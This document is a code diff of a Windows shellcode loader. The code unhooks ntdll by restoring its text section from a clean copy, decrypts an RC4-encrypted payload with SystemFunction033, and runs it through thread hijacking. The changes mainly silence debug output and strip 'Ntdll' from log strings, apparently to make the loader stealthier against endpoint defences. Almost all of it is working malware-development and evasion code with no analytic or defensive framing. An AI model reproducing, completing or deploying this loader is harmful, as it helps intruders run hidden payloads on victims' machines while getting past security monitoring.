@@ -128,18 +128,18 @@ SIZE_T GetNtdllSizeFromBaseAddress(IN PBYTE pNtdllModule) {
 
 	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pNtdllModule;
 
-	fprintf(stderr, "GetNtdllSizeFromBaseAddress\n");
+	// fprintf(stderr, "GetNtdllSizeFromBaseAddress\n");
 	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
-		fprintf(stderr, "GetNtdllSizeFromBaseAddress pImgDosHdr error\n");
+		fprintf(stderr, "GetSizeFromBaseAddress pImgDosHdr error\n");
 		return NULL;
 	}
 	
 	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pNtdllModule + pImgDosHdr->e_lfanew);
 	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
-		fprintf(stderr, "GetNtdllSizeFromBaseAddress pImgNtHdr error\n");
+		fprintf(stderr, "GetSizeFromBaseAddress pImgNtHdr error\n");
 		return NULL;
 	}
-	fprintf(stderr, "GetNtdllSizeFromBaseAddress done\n");
+	// fprintf(stderr, "GetNtdllSizeFromBaseAddress done\n");
 
 	return pImgNtHdrs->OptionalHeader.SizeOfImage;
 }
@@ -150,9 +150,9 @@ PVOID FetchLocalNtdllBaseAddress() {
 
 	// Reaching to the 'ntdll.dll' module directly (we know its the 2nd image after 'SuspendedProcessUnhooking.exe')
 	// 0x10 is = sizeof(LIST_ENTRY)
-	fprintf(stderr, "FetchLocalNtdllBaseAddress\n");
+	//fprintf(stderr, "FetchLocalNtdllBaseAddress\n");
 	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);
-	fprintf(stderr, "FetchLocalNtdllBaseAddress done\n");
+	//fprintf(stderr, "FetchLocalNtdllBaseAddress done\n");
 
 	return pLdr->DllBase;
 }
@@ -163,7 +163,7 @@ BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {
 	NTSTATUS	ntstatus;
 	HANDLE		curProc = GetCurrentProcess();
 
-	fprintf(stderr, "ReplaceNtdllTxtSection\n");
+	// fprintf(stderr, "ReplaceNtdllTxtSection\n");
 
 	// getting the dos header
 	PIMAGE_DOS_HEADER   pLocalDosHdr      = (PIMAGE_DOS_HEADER)pLocalNtdll;
@@ -203,11 +203,13 @@ BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {
 		return FALSE;
 	}
 
+	/*
 	// small check to verify that 'pRemoteNtdllTxt' is really the base address of the text section
 	if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt) {
 		fprintf(stderr, "Base address mismatch %llx - %llx\n", (unsigned __int64)pLocalNtdllTxt, (unsigned __int64)pRemoteNtdllTxt);
 		return FALSE;
 	}
+	*/
 
 //---------------------------------------------------------------------------------------------------------------------------
 	
@@ -220,7 +222,6 @@ BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {
 #if DEBUGGING == 1
         fprintf(stderr, "NTDLL NtProtectVirtualMemory error, ntstatus is %lx\n", ntstatus);
 #endif
-		fprintf(stderr, "NTDLL NtProtectVirtualMemory (set) error, ntstatus is %lx\n", ntstatus);
 		return FALSE;
     }
 
@@ -234,7 +235,6 @@ BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {
 #if DEBUGGING == 1
         fprintf(stderr, "NTDLL NtProtectVirtualMemory error, ntstatus is %lx\n", ntstatus);
 #endif
-		fprintf(stderr, "NTDLL NtProtectVirtualMemory (restore) error, ntstatus is %lx\n", ntstatus);
 		return FALSE;
 	}
 
@@ -260,23 +260,8 @@ BOOL GetPayloadFromFile(char *szFilename, OUT PVOID* pNtdllBuffer, OUT PSIZE_T s
 	PBYTE		pBytes = NULL,				// Used as the total heap buffer counter
 		        pTmpBytes = NULL;			// Used as the tmp buffer (of size 1024)
 
-/*
-// Opening the internet session handle, all arguments are NULL here since no proxy options are required
-	hInternet = InternetOpenW(L"MalDevAcademy", NULL, NULL, NULL, NULL);
-	if (hInternet == NULL) {
-		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
-		bSTATE = FALSE; goto _EndOfFunction;
-	}
-
-	// Opening the handle to the ntdll file using theURL
-	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
-	if (hInternetFile == NULL) {
-		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
-		bSTATE = FALSE; goto _EndOfFunction;
-	}
-*/
 	if ((infile = fopen(szFilename, "rb")) == NULL) {
-		fprintf(stderr, "Error reading file %s\n", szFilename);
+		fprintf(stderr, "Error reading payload file %s\n", szFilename);
 		return FALSE;
 	}
 
@@ -290,7 +275,7 @@ BOOL GetPayloadFromFile(char *szFilename, OUT PVOID* pNtdllBuffer, OUT PSIZE_T s
 		// Reading 1024 bytes to the tmp buffer. The function will read less bytes in case the file is less than 1024 bytes.
 		if ((dwBytesRead = fread(pTmpBytes, sizeof(char), 1024, infile)) == 0) {
 			if (ferror(infile)) {
-				fprintf(stderr, "File %s read error %d\n", szFilename, errno);
+				//fprintf(stderr, "File %s read error %d\n", szFilename, errno);
 				return FALSE;
 			}
 		}
@@ -333,7 +318,7 @@ BOOL GetPayloadFromFile(char *szFilename, OUT PVOID* pNtdllBuffer, OUT PSIZE_T s
 	*sNtdllSize = sSize;
 }
 
-BOOL ReadNtdllFromFile(char *szFilename, OUT PVOID* ppNtdllBuf) {
+BOOL ReadNtdllFromFile(char *szFilename, IN PVOID pNtDllModule, OUT PVOID* ppNtdllBuf) {
 
 	PBYTE      pNtdllModule = (PBYTE)FetchLocalNtdllBaseAddress();
 	PVOID      pNtdllBuffer = NULL;
@@ -366,7 +351,7 @@ BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload) {
 
 	CONTEXT		ThreadCtx;
 
-	fprintf(stderr, "RunViaClassicThreadHijacking with code at %llx\n", (unsigned __int64)pPayload);
+	//fprintf(stderr, "RunViaClassicThreadHijacking with code at %llx\n", (unsigned __int64)pPayload);
 
 	ThreadCtx.ContextFlags = CONTEXT_ALL; // CONTEXT_CONTROL;
 
@@ -376,14 +361,14 @@ BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload) {
 		return FALSE;
 	}
 
-	fprintf(stderr, "Got thread context\n");
-	fprintf(stderr, "Current RIP is %llx\n", (unsigned __int64)ThreadCtx.Rip);
+	//fprintf(stderr, "Got thread context\n");
+	//fprintf(stderr, "Current RIP is %llx\n", (unsigned __int64)ThreadCtx.Rip);
 
 	// Updating the next instruction pointer to be equal to the payload's address 
 	ThreadCtx.Rip = (DWORD64) pPayload;
 
-	fprintf(stderr, "New RIP is %llx\n", (unsigned __int64)ThreadCtx.Rip);
-	getchar();
+	//fprintf(stderr, "New RIP is %llx\n", (unsigned __int64)ThreadCtx.Rip);
+	//getchar();
 
 	/*
 		- in case of a x64 payload injection : we change the value of `Rip`
@@ -533,17 +518,17 @@ int main(int argc, char **argv)
 	PBYTE	pNtdllBuffer		= NULL;
 	SIZE_T	sNtdllSize		    = NULL, sNumberOfBytesRead = NULL;
 	
-	fprintf(stderr, "[i] Fetching a clean \"ntdll.dll\" File From A Suspended Process, pid %d\n", GetProcessId(process_info->hProcess));
+	fprintf(stderr, "[i] Fetching a clean file From A Suspended Process, pid %d\n", GetProcessId(process_info->hProcess));
 
 	// allocating enough memory to read ntdll from the remote process
 	sNtdllSize = GetNtdllSizeFromBaseAddress((PBYTE)pNtdllModule);
 	if (!sNtdllSize) {
-		fprintf(stderr, "GetNtdllSizeFromBaseAddress error\n");
+		// fprintf(stderr, "GetNtdllSizeFromBaseAddress error\n");
 		exit(1);
 	}
 	pNtdllBuffer = (unsigned char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sNtdllSize);
 	if (!pNtdllBuffer) {
-		fprintf(stderr, "HeapAlloc error\n");
+		// fprintf(stderr, "HeapAlloc error\n");
 		exit(1);
 	}
 
@@ -556,8 +541,8 @@ int main(int argc, char **argv)
 		// try from clean file...
 		char ntdllfile[MAX_PATH] = FIXED_FILENAME;
 
-		if (!ReadNtdllFromFile(ntdllfile, (PVOID *)pNtdllBuffer)) {
-			fprintf(stderr, "[!] ReadNtdllFromFile Failed with Error : %d \n", GetLastError());
+		if (!ReadNtdllFromFile(ntdllfile, (PVOID) pNtdllModule, (PVOID *)pNtdllBuffer)) {
+			fprintf(stderr, "[!] ReadDllFromFile Failed with Error : %d \n", GetLastError());
 			exit(1);
 		}
 	}
@@ -573,7 +558,7 @@ int main(int argc, char **argv)
 */
 
 	if (!ReplaceNtdllTxtSection(pNtdllBuffer)) {
-		fprintf(stderr, "ReplaceNtdllTxtSection failed\n");
+		fprintf(stderr, "ReplaceTxtSection failed\n");
 		exit(1);
 	}
 
@@ -594,13 +579,12 @@ int main(int argc, char **argv)
 #if DEBUGGING == 1
 	fprintf(stderr, "Injecting shellcode into process %d\n", GetProcessId(process_info->hProcess));
 #endif
-	fprintf(stderr, "Injecting shellcode into process %d\n", GetProcessId(process_info->hProcess));
 
     // Allocate Virtual Memory
     code_size = (SIZE_T)shellcode_size;
-	fprintf(stderr, "1.Shellcode size is %d, code_size is %d\n", shellcode_size, code_size);
+	//fprintf(stderr, "1.Shellcode size is %d, code_size is %d\n", shellcode_size, code_size);
 	ntstatus = NtAllocateVirtualMemory(process_info->hProcess, &start_address, 0, &code_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	fprintf(stderr, "1a.Shellcode size is %d, code_size is %d\n", shellcode_size, code_size);
+	//fprintf(stderr, "1a.Shellcode size is %d, code_size is %d\n", shellcode_size, code_size);
 	if (!NT_SUCCESS(ntstatus)) {
 #if DEBUGGING == 1
         fprintf(stderr, "NtAllocVirtualMemory error, ntstatus is %d\n", ntstatus);
@@ -616,7 +600,7 @@ int main(int argc, char **argv)
     }
 
 	shellcode_size = temp;
-	fprintf(stderr, "2.Shellcode size is %d\n", shellcode_size);
+	//fprintf(stderr, "2.Shellcode size is %d\n", shellcode_size);
 #if USEHTTP == 1
 	std::copy(begin(shellcode), end(shellcode), buf);
 #endif
@@ -627,7 +611,7 @@ int main(int argc, char **argv)
 	key.MaximumLength = sizeof(_key);
 
 	shellcode_size = temp;
-	fprintf(stderr, "3.Shellcode size is %d\n", shellcode_size);
+	//fprintf(stderr, "3.Shellcode size is %d\n", shellcode_size);
 	temp = shellcode_size;
 
 	_data.Buffer = (PUCHAR)buf;
@@ -655,7 +639,7 @@ int main(int argc, char **argv)
 	SystemFunction033(&_data, &key);
 
 	shellcode_size = temp;
-	fprintf(stderr, "Shellcode size is %d\n", shellcode_size);
+	//fprintf(stderr, "Shellcode size is %d\n", shellcode_size);
 
 #if DEBUGGING == 1
 	printf("Decrypted, press enter to continue...\n");
@@ -663,7 +647,7 @@ int main(int argc, char **argv)
 #endif
 
 	shellcode_size = temp;
-	fprintf(stderr, "Decrypted, shellcode size is %d\n", shellcode_size);
+	//fprintf(stderr, "Decrypted, shellcode size is %d\n", shellcode_size);
 
 	// Copy encrypted shellcode into allocated memory
 	//fprintf(stderr, "4.Shellcode size is %d\n", shellcode_size);
@@ -712,11 +696,11 @@ int main(int argc, char **argv)
 	// Creating sacrificial thread in suspended state 
 	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&DummyFunction, NULL, CREATE_SUSPENDED, &dwThreadId);
 	if (hThread == NULL) {
-		fprintf(stderr, "[!] CreateThread Failed With Error : %d \n", GetLastError());
+		//fprintf(stderr, "[!] CreateThread Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
-	fprintf(stderr,"[i] Hijacking Thread Of Id : %d ... ", dwThreadId);
+	//fprintf(stderr,"[i] Hijacking Thread Of Id : %d ... ", dwThreadId);
 	// hijacking the sacrificial thread created, point it to our shellcode
 	if (!RunViaClassicThreadHijacking(hThread, (PBYTE)start_address)) {
 		fprintf(stderr, "ThreadHijack error\n");
